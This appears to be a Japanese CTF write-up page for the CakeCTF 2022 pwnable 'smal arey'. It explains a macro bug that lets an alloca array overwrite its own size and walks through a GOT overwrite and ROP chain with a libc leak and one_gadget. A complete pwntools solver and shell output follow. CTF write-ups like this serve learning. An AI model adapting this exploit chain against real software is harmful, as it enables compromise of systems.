@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="ja-jp">
+
+    <head><title>CakeCTF2022 smal aley (SAMPLE) &ndash; Team Enu</title>
+<meta name="description" content="Team EnuのWriteupや活動の紹介を掲載しています。">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="http://localhost:8080/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="http://localhost:8080/css/risotto.css">
+<link rel="stylesheet" href="http://localhost:8080/css/custom.css">
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><h1 class="page__logo"><a href="http://localhost:8080" class="page__logo-inner">Team Enu</a></h1>
+<nav class="page__nav main-nav">
+    <ul>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/members/" title="">Members</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/writeups/" title="">Writeups</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/news/" title="">News</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>CakeCTF2022 smal aley (SAMPLE)</h1>
+    </header>
+    <div class="content__body">
+        <h2 id="問題">問題</h2>
+<p>CakeCTF 2022においてpwnableのジャンルで出題された問題．</p>
+<p><strong>与えられたソースコード</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ARRAY_SIZE(n) (n * sizeof(long))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> size, index, <span style="color:#f92672">*</span>arr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;size: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (scanf(<span style="color:#e6db74">&#34;%ld&#34;</span>, <span style="color:#f92672">&amp;</span>size) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  arr <span style="color:#f92672">=</span> ARRAY_NEW(size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;index: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (scanf(<span style="color:#e6db74">&#34;%ld&#34;</span>, <span style="color:#f92672">&amp;</span>index) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> index <span style="color:#f92672">&gt;=</span> size)
+</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;value: &#34;</span>);
+</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;%ld&#34;</span>, <span style="color:#f92672">&amp;</span>arr[index]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__attribute__((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> setup(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  alarm(<span style="color:#ae81ff">180</span>);
+</span></span><span style="display:flex;"><span>  setbuf(stdin, NULL);
+</span></span><span style="display:flex;"><span>  setbuf(stdout, NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>これを見ると， <code>size &lt;= 5</code> までの <code>size</code> を入力し， <code>long[size]</code> の配列を作成することができるプログラムのようである． その後は<code>alloca</code> によりスタック上に確保された配列の <code>index</code> と <code>value</code> を指定し，値を格納することができる．</p>
+<p>とりあえず，脆弱性がわからないので，gdbでうろうろすると， <code>size = 5</code> のときに， <code>arr[4]</code> の値が <code>size</code> が格納されている領域が被っていることに気づく．</p>
+<p><code>size = 5</code> のときの <code>index</code> の入力前</p>
+<pre tabindex="0"><code>gef➤  dps
+0x00007fffffffdba0│+0x0000: 0x0000000000401380  ← $rsp
+0x00007fffffffdba8│+0x0008: 0x00007ffff7ffe190
+0x00007fffffffdbb0│+0x0010: 0x0000000000000003
+0x00007fffffffdbb8│+0x0018: 0x00000000004011fa
+0x00007fffffffdbc0│+0x0020: 0x0000000000000005  // size = 5
+0x00007fffffffdbc8│+0x0028: 0x00000000004010d0
+0x00007fffffffdbd0│+0x0030: 0x00007fffffffdba0  // arr = 0x00007fffffffdba0
+0x00007fffffffdbd8│+0x0038: 0x5735d60ff465aa00  // canary
+0x00007fffffffdbe0│+0x0040: 0x0000000000000000   ← $rbp
+</code></pre><p><code>size = 5 index = 4 value = 0x255</code>の入力後</p>
+<pre tabindex="0"><code>0x00007fffffffdba0│+0x0000: 0x0000000000401380  // arr[0]← $rsp
+0x00007fffffffdba8│+0x0008: 0x00007ffff7ffe190  // arr[1]
+0x00007fffffffdbb0│+0x0010: 0x0000000000000003  // arr[2]
+0x00007fffffffdbb8│+0x0018: 0x00000000004011fa  // arr[3]
+0x00007fffffffdbc0│+0x0020: 0x00000000000000ff  // arr[4] = 255 size = 255
+0x00007fffffffdbc8│+0x0028: 0x0000000000000004  // index = 4
+0x00007fffffffdbd0│+0x0030: 0x00007fffffffdba0  // arr = 0x00007fffffffdba0
+0x00007fffffffdbd8│+0x0038: 0x5735d60ff465aa00  // canary
+0x00007fffffffdbe0│+0x0040: 0x0000000000000000   ← $rbp
+</code></pre><p><code>value</code> の入力前後を見てみると， <code>arr[4]</code> と <code>size</code> のアドレスが同じであるため， <code>size</code> を書き換え可能である． このため， <code>size</code> を大きな値に書き換えると， <code>arr</code> の範囲外参照が可能となる．</p>
+<p>ここで，<code>arr</code> のアドレスからの <code>index</code> に <code>value</code> を代入していることから， <code>arr</code> の格納されている領域 ( <code>arr[6]</code> に該当) に値を書き込みたいアドレスに書き換え， <code>index = 0</code> を指定すると，一度限りの AAW が可能である．</p>
+<p>あとは，配布されたlibcから one gadegetを探して飛ばせばよい． libcのアドレスがわからないため，ROPから <code>printf(printf)</code> をすることで， <code>printf</code> のアドレスを漏洩させ，libc leakを考える．</p>
+<p>これで早速リターンアドレスを書き換えてROPに持ち込もうとしたら，リターンアドレスがない!!!</p>
+<p>びっくりしましたが，よくソースコードを見ると確かにreturnがない． ということでよくソースコードを見ると，Partial RELROなため，GOTが書き換え可能であり，好きなタイミングで呼びだせる <code>exit</code> があやしい．</p>
+<p>先程説明したAAWを利用することで，GOT Overwriteが可能なため， exit のGOTをROP chainに繋げることで，ROPの発火が可能そう．</p>
+<p>GOT OverwriteからROPに繋げる方法として， <code>call</code> 命令によりスタックに積まれる <code>rip</code> を無視する必要があるので，GOTに <code>pop ret</code> のガジェットのアドレスをあげればうまく <code>rsp</code> のアドレスに配置したガジェットに繋がる． <code>pop</code> の回数を増やすと， <code>rsp</code> からのオフセットを増やせるため，結構融通が効く．</p>
+<p><code>printf(printf)</code> でlibc leakをしたら，もう一度AAWで <code>exit</code> のGOTを one gadgetに書き換えたいので，ROPで <code>main</code> に飛ばす．</p>
+<p>地味なハマりポイントとして， <code>main</code> の頭に飛ばしてしまうと， <code>push rbp</code> により，スタックがズレるので注意．気づくまでそこそこ沼った．</p>
+<p><code>push rbp</code> の次のアドレスに無事に飛ばせると，先程と同様の操作でAAWで <code>exit</code> のGOTを one gadgetに書き換えて <code>exit</code> を実行させるとシェルが取れる．</p>
+<p>ちなみに，スタックがズレる理由はマクロにあるようで，</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define ARRAY_SIZE(n) (n * sizeof(long))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))
+</span></span></span></code></pre></div><p>は</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)alloca(n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">*</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>)))
+</span></span></code></pre></div><p>と展開されるため十分な領域が確保されなかったのが問題らしい． （ <code>size = 5</code> で32 byteが確保されてるのはアライメントの問題？）</p>
+<p>とりあえず，実験のため以下のような簡単なプログラムを書いて， <code>alloca(8)</code> と <code>alloca(9)</code> のスタックの状態を比較する．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>arr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)alloca(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>alloca(8)</code> のとき</p>
+<pre tabindex="0"><code>0x00007fffffffdbc0│+0x0000: 0x0000000000000000  // arr[0] ← $rsp
+0x00007fffffffdbc8│+0x0008: 0x0000000000401050  // arr[1]
+0x00007fffffffdbd0│+0x0010: 0x00007fffffffdbc0  // arr
+0x00007fffffffdbd8│+0x0018: 0xf95e69f73f01ac00
+0x00007fffffffdbe0│+0x0020: 0x0000000000000000   ← $rbp
+</code></pre><p><code>alloca(9)</code> のとき</p>
+<pre tabindex="0"><code>0x00007fffffffdbb0│+0x0000: 0x00007ffff7fae2e8  // arr[0] ← $rsp
+0x00007fffffffdbb8│+0x0008: 0x0000000000401200  // arr[1]
+0x00007fffffffdbc0│+0x0010: 0x0000000000000000  // arr[2]
+0x00007fffffffdbc8│+0x0018: 0x0000000000401050  // arr[3]
+0x00007fffffffdbd0│+0x0020: 0x00007fffffffdbb0  // arr
+000      ← $rcx
+0x00007fffffffdbd8│+0x0028: 0xf5befdf7c3de9700
+0x00007fffffffdbe0│+0x0030: 0x0000000000000000   ← $rbp
+</code></pre><p>これ最初はなんで9byteの領域を確保した瞬間 32byteも確保されたのかなとか考えてたけど， x86-64において， <code>rsp</code> は16byteでアラインされることが原因ぽい．</p>
+<p>何故9byte目で最初のアラインが発生するのかよくわからないが，その後は25byte目でアラインされることを確認したので， <code>alloca</code> により確保された一番高位の8byteは使用されないようになってるぽい．</p>
+<pre tabindex="0"><code>|--------------| &lt;- 元のrsp
+|  使用されない  |
+|--------------|
+|    arr[0]    |
+|--------------| &lt;- rsp
+|              |
+</code></pre><p>つまり，問題では <code>size = 5</code> のとき， <code>alloca(48)</code> を実行するつもりがマクロのミスにより， <code>alloca(13)</code> が実行された結果，アライメントを考慮すると32byteの領域が確保されており， <code>arr[4]</code> で範囲外参照が発生して，それが偶然 <code>size</code> の変数だった，というのが筋書きだったらしい．なるほど．</p>
+<h2 id="solver">solver</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bin_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+</span></span><span style="display:flex;"><span>context(os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span>, arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>binf <span style="color:#f92672">=</span> ELF(bin_file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## nc pwn1.2022.cakectf.com 9002</span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;pwn1.2022.cakectf.com&#39;</span>, <span style="color:#ae81ff">9002</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># conn = process(bin_file)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># conn = gdb.debug(bin_file,&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># b *0x4013e3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># c</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># c</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># b *0x401090</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#39;&#39;&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">overwrite</span>(index, value):
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;value: &#39;</span>, str(value)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AAW</span>(addr, data):
+</span></span><span style="display:flex;"><span>    overwrite(<span style="color:#ae81ff">6</span>, addr)
+</span></span><span style="display:flex;"><span>    overwrite(<span style="color:#ae81ff">0</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## size = 5</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;size: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## size = 10000</span>
+</span></span><span style="display:flex;"><span>overwrite(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">10000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## ROP gadget</span>
+</span></span><span style="display:flex;"><span>exit_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404038</span>
+</span></span><span style="display:flex;"><span>printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
+</span></span><span style="display:flex;"><span>printf_plt <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x401090</span>
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011bb</span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4013e3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## ROP chain</span>
+</span></span><span style="display:flex;"><span>overwrite(<span style="color:#ae81ff">0</span>, pop_rdi_ret)
+</span></span><span style="display:flex;"><span>overwrite(<span style="color:#ae81ff">1</span>, printf_got)
+</span></span><span style="display:flex;"><span>overwrite(<span style="color:#ae81ff">2</span>, printf_plt)
+</span></span><span style="display:flex;"><span>overwrite(<span style="color:#ae81ff">3</span>, main)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## ignite ROP chain</span>
+</span></span><span style="display:flex;"><span>AAW(exit_got, pop_rdi_ret)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## libc leak</span>
+</span></span><span style="display:flex;"><span>printf_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x61c90</span>
+</span></span><span style="display:flex;"><span>printf_libc <span style="color:#f92672">=</span> unpack(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>), <span style="color:#e6db74">&#39;all&#39;</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> printf_libc <span style="color:#f92672">-</span> printf_offset
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;libc_base = 0x</span><span style="color:#e6db74">{:0x}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(libc_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## size = 5</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;size: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## size = 10000</span>
+</span></span><span style="display:flex;"><span>overwrite(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">10000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## jmp one_gadget</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one_gadget_offset = 0xe3afe</span>
+</span></span><span style="display:flex;"><span>one_gadget_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe3b01</span>
+</span></span><span style="display:flex;"><span>one_gadget_libc <span style="color:#f92672">=</span> libc_base<span style="color:#f92672">+</span>one_gadget_offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>AAW(exit_got, one_gadget_libc)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><pre tabindex="0"><code>$ python solve.py
+[*] &#39;/home/mc4nf/ctf/cakectf/2022/pwn/smal_arey/chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to pwn1.2022.cakectf.com on port 9002: Done
+libc_base = 0x7faa43604000
+[*] Switching to interactive mode
+$ ls
+chall
+flag-c665afc224a93b0c2e4cf82abfedf180.txt
+$ cat flag*
+CakeCTF{PRE01-C. Use parentheses within macros around parameter names}
+</code></pre><h3 id="cakectfpre01-c-use-parentheses-within-macros-around-parameter-names">CakeCTF{PRE01-C. Use parentheses within macros around parameter names}</h3>
+
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    <img class="about__logo" src="http://localhost:8080/team-enu.png" alt="Logo">
+<h1 class="about__title">Team Enu</h1>
+<p class="about__description">Team EnuのWriteupや活動の紹介を掲載しています。</p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+    
+        <p>
+            By 芝海人, 
+            2022-10-19
+        </p>
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+    
+    
+</p>
+<br /><br />
+<p class="copyright"></p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
